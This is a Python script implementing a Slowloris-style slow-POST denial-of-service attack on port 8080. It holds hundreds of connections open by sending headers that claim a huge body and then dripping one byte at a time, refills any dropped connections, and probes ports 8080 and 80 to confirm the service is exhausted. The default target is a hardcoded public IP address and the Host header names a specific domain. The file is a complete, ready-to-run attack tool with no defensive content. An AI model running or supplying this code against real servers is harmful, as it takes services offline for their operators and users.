#!/usr/bin/env python3
"""
Slowloris HTTP connection exhaustion on port 8080.
Sends partial HTTP headers to hold server-side connections open.
Runs until Ctrl+C.

Two proof metrics:
  - probe_8080 : tries to open a fresh connection to :8080 each cycle
                 timeout/refused = pool exhausted
  - probe_80   : tries to open a fresh TCP connection to :80
                 timeout/refused = cross-port impact proven

Usage:
  python3 slowloris_8080.py
  python3 slowloris_8080.py --target 104.236.68.226 --port 8080 --connections 300
"""

import socket, select, threading, time, argparse
from datetime import datetime

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; B = "\033[1m"; W = "\033[0m"

COMPLETE_HEADERS = (
    b"POST / HTTP/1.1\r\n"
    b"Host: metoo-shatkin.com\r\n"
    b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n"
    b"Accept: text/html,application/xhtml+xml\r\n"
    b"Content-Type: application/octet-stream\r\n"
    b"Content-Length: 999999999\r\n"
    b"\r\n"                         # headers complete — server allocates body buffer
)
DRIP_INTERVAL = 5   # seconds between each 1-byte drip


def probe_port(target, port, timeout=5):
    """Try to open a fresh TCP connection. Returns (connected:bool, latency_ms:float)."""
    s = socket.socket()
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((target, port))
        ms = (time.time() - t0) * 1000
        s.close()
        return True, ms
    except socket.timeout:
        return False, timeout * 1000
    except ConnectionRefusedError:
        return False, (time.time() - t0) * 1000
    except Exception:
        return False, (time.time() - t0) * 1000


def _is_dead(s):
    """
    Check if server closed the connection on its side.
    select() readable + recv(1, PEEK) returning b'' = server closed.
    """
    try:
        r, _, _ = select.select([s], [], [], 0)
        if r:
            data = s.recv(1, socket.MSG_PEEK)
            return data == b''   # b'' = FIN received = server closed
        return False             # not readable = still open
    except Exception:
        return True


def open_slowloris_socket(target, port):
    """
    Connect, send complete headers with Content-Length: 999999999,
    then drip 1 byte every DRIP_INTERVAL seconds in a background thread.
    Server allocates body buffer and pins a worker waiting for the rest.
    Returns socket or None.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        s.settimeout(None)
        s.send(COMPLETE_HEADERS)
        threading.Thread(target=_drip, args=(s,), daemon=True).start()
        return s
    except Exception:
        return None


def _drip(s):
    """Send 1 byte every DRIP_INTERVAL seconds to keep the body transfer alive."""
    while True:
        try:
            s.send(b'x')
            time.sleep(DRIP_INTERVAL)
        except Exception:
            return


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target",         default="104.236.68.226")
    p.add_argument("--port",           type=int, default=8080)
    p.add_argument("--connections",    type=int, default=300)
    p.add_argument("--check-interval", type=float, default=6.0)
    args = p.parse_args()

    socks = []
    lock  = threading.Lock()
    stop  = threading.Event()

    print(f"""
{B}{'='*62}{W}
  Slowloris — partial HTTP header exhaustion on :{args.port}
{B}{'='*62}{W}
  Target      : {args.target}:{args.port}
  Connections : {args.connections} (slow POST body, auto-refill dead)
  Proof       : probe_8080 + probe_80 fresh-connect each cycle
{B}{'='*62}{W}
""")

    def fill_pool():
        while not stop.is_set():
            with lock:
                dead = [s for s in socks if _is_dead(s)]
                for s in dead:
                    socks.remove(s)
                    try: s.close()
                    except: pass
                needed = args.connections - len(socks)

            opened = 0
            for _ in range(needed):
                if stop.is_set():
                    break
                s = open_slowloris_socket(args.target, args.port)
                if s:
                    with lock:
                        socks.append(s)
                    opened += 1
            time.sleep(1)

    def status_loop():
        while not stop.is_set():
            time.sleep(args.check_interval)
            with lock:
                held = len(socks)

            ts = datetime.now().strftime("%H:%M:%S")

            ok_8080, ms_8080 = probe_port(args.target, args.port)
            ok_80,   ms_80   = probe_port(args.target, 80)

            p8 = f"{G}OPEN {ms_8080:.0f}ms{W}" if ok_8080 else f"{R}BLOCKED {ms_8080:.0f}ms{W}"
            p80 = f"{G}OPEN {ms_80:.0f}ms{W}"  if ok_80   else f"{R}BLOCKED {ms_80:.0f}ms{W}"

            print(f"  {ts} | held={held:>3} | probe_8080={p8} | probe_80={p80}")

    threading.Thread(target=fill_pool,   daemon=True).start()
    threading.Thread(target=status_loop, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
        stop.set()
        with lock:
            for s in socks:
                try: s.close()
                except: pass


if __name__ == "__main__":
    main()
